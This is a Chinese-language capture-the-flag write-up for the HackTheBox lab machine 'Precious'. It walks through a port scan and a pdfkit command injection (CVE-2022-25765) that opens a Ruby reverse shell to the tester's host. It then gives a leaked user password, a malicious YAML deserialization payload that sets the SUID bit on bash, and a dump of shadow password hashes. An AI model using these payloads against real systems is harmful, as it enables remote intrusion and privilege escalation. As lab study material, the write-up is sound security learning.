---
title: Precious - HackTheBox
url: https://darkwing.moe/2022/12/03/Precious-HackTheBox/
source: 喵喵喵喵
date: 2022-12-04
fetch_date: 2025-10-04T00:27:39.723150
---

# Precious - HackTheBox

[![](/img/avatar.jpg)](/)

##### 暗羽

Discord@darkwing\_nya

* [主页](/)
* [Archives](/archives)
* [Tags](/tags)
* [Categories](/categories)
* [Github](https://github.com/zjicmDarkWing)
* [Twitter](https://twitter.com/darkwing_nya)
* [Buy me a coffee](https://www.buymeacoffee.com/darkwing_nya)
* [About](https://darkwing.moe/2015/01/01/about/)

Precious - HackTheBox

# Precious - HackTheBox

##### 2022-12-03

#### TOC

1. [1. 基本信息](#基本信息)
   1. [1.1. 10.10.11.189](#10-10-11-189)
2. [2. 端口扫描](#端口扫描)
   1. [2.1. 80](#80)
3. [3. pdfkit](#pdfkit)
   1. [3.1. reverse shell](#reverse-shell)
   2. [3.2. 信息](#信息)
4. [4. user flag](#user-flag)
5. [5. 提权信息](#提权信息)
   1. [5.1. yaml](#yaml)
6. [6. 提权 & root flag](#提权-amp-root-flag)
   1. [6.1. dependencies.yml](#dependencies-yml)
   2. [6.2. shadow](#shadow)
7. [7. 参考资料](#参考资料)

# Precious - HackTheBox

2022-12-03

# 基本信息

* <https://www.hackthebox.com/home/machines/profile/513>
* ## 10.10.11.189

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022120301.jpg)

# 端口扫描

22和80:

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 ``` | ``` $ nmap -sC -sV -Pn 10.10.11.189 Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-03 15:24 CST Nmap scan report for 10.10.11.189 Host is up (0.31s latency). Not shown: 996 closed tcp ports (conn-refused) PORT     STATE    SERVICE   VERSION 22/tcp   open     ssh       OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) | ssh-hostkey: |   3072 845e13a8e31e20661d235550f63047d2 (RSA) |   256 a2ef7b9665ce4161c467ee4e96c7c892 (ECDSA) |_  256 33053dcd7ab798458239e7ae3c91a658 (ED25519) 80/tcp   open     http      nginx 1.18.0 |_http-server-header: nginx/1.18.0 |_http-title: Did not follow redirect to http://precious.htb/ 2161/tcp filtered apc-agent 8045/tcp filtered unknown Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 95.64 seconds ``` |

## 80

需要加hosts：

|  |  |
| --- | --- |
| ``` 1 ``` | ``` 10.10.11.189 precious.htb ``` |

输入URL转换成PDF：

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022120302.jpg)

# pdfkit

测试pdf转换，发现使用pdfkit v0.8.6：

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022120303.jpg)

搜到相关漏洞：

* Command Injection in pdfkit | CVE-2022-25765 | Snyk
  <https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795>

## reverse shell

打到ruby shell：

|  |  |
| --- | --- |
| ``` 1 ``` | ``` http://10.10.14.10:7777/?name=#{'%20`ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("10.10.14.10",4444))'`'} ``` |

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022120304.jpg)

## 信息

bundle config中得到henry用户密码：

|  |  |
| --- | --- |
| ``` 1 ``` | ``` henry:Q3c1AqGHtoI0aXAYFH ``` |

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022120305.jpg)

# user flag

henry用户ssh登录，得到user flag：

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022120306.jpg)

# 提权信息

sudo -l 发现一个ruby脚本，调用yaml，找到原本的yaml文件确认yaml库版本：

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022120307.jpg)

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022120308.jpg)

## yaml

yaml反序列化：

* Blind Remote Code Execution through YAML Deserialization
  <https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/>

# 提权 & root flag

构造一个恶意yml文件，调用ruby脚本触发命令执行：

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022120309.jpg)

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022120310.jpg)

## dependencies.yml

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 ``` | ``` --- - !ruby/object:Gem::Installer     i: x - !ruby/object:Gem::SpecFetcher     i: y - !ruby/object:Gem::Requirement   requirements:     !ruby/object:Gem::Package::TarReader     io: &1 !ruby/object:Net::BufferedIO       io: &1 !ruby/object:Gem::Package::TarReader::Entry          read: 0          header: "abc"       debug_output: &1 !ruby/object:Net::WriteAdapter          socket: &1 !ruby/object:Gem::RequestSet              sets: !ruby/object:Net::WriteAdapter                  socket: !ruby/module 'Kernel'                  method_id: :system              git_set: chmod +s /usr/bin/bash          method_id: :resolve ``` |

## shadow

|  |  |
| --- | --- |
| ``` 1 2 ``` | ``` root:$y$j9T$a.ggVdbxv0sDezKDImKn91$BB2mMoZ0UwInxNcXuyDALhr4li59AHfVw5DuV0d5Ww1:19284:0:99999:7::: henry:$y$j9T$Q/v28PgszKjK0KDbSATMs1$7K1zLKHnnClQLLI92aeVT9HQXA6bgaG4BOTgLTGi.gA:19261:0:99999:7::: ``` |

# 参考资料

* Command Injection in pdfkit | CVE-2022-25765 | Snyk
  <https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795>
* Blind Remote Code Execution through YAML Deserialization
  <https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/>
* Precious - HTB [Discussion] | BreachForums
  <https://breached.vc/Thread-Precious-HTB-Discussion>
* HTB - Precious [Easy] // meowmeowattack
  <https://meowmeowattack.github.io/htb/precious/>

> Last updated: 2023-05-22 09:38:13
>
> 水平不济整日被虐这也不会那也得学,脑子太蠢天天垫底这看不懂那学不会
>
> [![暗羽](/img/avatar.jpg)
> 暗羽](https://darkwing.moe)

* [HackTheBox](/tags/HackTheBox/)

[Prev

#### Extension - HackTheBox](/2022/12/04/Extension-HackTheBox/)

[Next

#### Derailed - HackTheBox](/2022/11/28/Derailed-HackTheBox/)

站点总访客数：

站点总访问量：

This blog is licensed under a [Creative Commons Attribution 4.0 International License](https://creativecommons.org/licenses/by/4.0/).

暗羽 © 2014 - 2025

Power by [Hexo](http://hexo.io/) Theme [indigo](https://github.com/yscoder/hexo-theme-indigo)

扫一扫，分享到微信

![微信分享二维码](data:image/png;base64...)

- [{title}

  {tags}

  {date}](%7Bpath%7D)